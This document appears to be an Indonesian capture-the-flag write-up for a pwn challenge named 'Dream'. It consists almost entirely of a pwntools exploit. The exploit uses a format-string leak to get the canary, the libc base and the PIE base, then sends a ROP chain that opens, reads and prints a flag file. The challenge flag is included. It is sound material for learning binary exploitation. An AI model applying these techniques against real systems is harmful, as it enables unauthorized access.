# Dream
---
## Deskripsi

Do you know my dream? tell your dream first :P
	


## Solusi
Untuk menyelesaikan soal tersebut dapat menggunakan program yang telah dibuat sebagai berikut:
```
#!/usr/bin/env python2
from pwn import *
import sys

#MyTemplate
elf = ELF("./aradream")

lokal = False
context.binary = elf
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

if lokal:
    xp = process([elf.path])
else:
    host = 'localhost'
    port = '10111'
    xp = remote(host,port)

if Debug:
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)


#Exploit Here
libc = elf.libc
pop_rdi = 0x0000000000001673 #: pop rdi ; ret
pop_rsi = 0x0000000000001671 #: pop rsi ; pop r15 ; ret
ret = 0x000000000000101a #: ret
sl("|%19$p|%17$p|%23$p|%400c%7$n")
ru("|")
leak = xp.recvn(48).split("|")

print leak
libcleak = int(leak[0],16)
canary = int(leak[1],16)
base = int(leak[2],16) - 0x1557

libc.address = libcleak - libc.symbols['__libc_start_main'] - 243
print hex(libc.address)
system = libc.symbols['system']
bin_sh = libc.search('/bin/sh').next()


print hex(libcleak),hex(canary),hex(base)

# p = "A"*(9*8)
# p += p64(canary)
# p += "B"*8
# p += p64(base+pop_rdi)
# p += p64(0xDEADBEEF)
# p += p64(base+pop_rsi)
# p += p64(0xDEADC0DE)*2
# p += p64(base+elf.symbols['mystery'])


pop_rdx = 0x000000000011c371 #: pop rdx ; pop r12 ; ret
pop_rax = 0x000000000004a550 #: pop rax ; ret
syscall = libc.symbols['execve']+9
p = "A"*(9*8)
p += p64(canary)
p += "B"*8
p += p64(base+pop_rdi)
p += p64(0)
p += p64(libc.address + pop_rax)
p += p64(0x0)
p += p64(base+pop_rsi)
p += p64(base+elf.bss())*2
p += p64(libc.address + pop_rdx)
p += p64(0x100)*2
p += p64(syscall)
p += p64(base+pop_rdi)
p += p64(base+elf.bss())
p += p64(base+pop_rsi)
p += p64(0)*2
p += p64(libc.address + pop_rdx)
p += p64(0x50)*2
p += p64(libc.address + pop_rax)
p += p64(0x2)
p += p64(syscall)
p += p64(libc.address + pop_rax)
p += p64(0x0)
p += p64(base+pop_rdi)
p += p64(0x3)
p += p64(base+pop_rsi)
p += p64(base+elf.bss()+0x100)*2
p += p64(syscall)
p += p64(libc.address + pop_rax)
p += p64(0x1)
p += p64(base+pop_rdi)
p += p64(0x1)
p += p64(base+pop_rsi)
p += p64(base+elf.bss()+0x100)*2
p += p64(syscall)


sl(p)
pause()
sl("/home/ctf/araflag.txt\x00")

xp.interactive()
```
#### ara2021{mY_Dr34m_1s_t0_B3c0m3_H4ck3r1337}
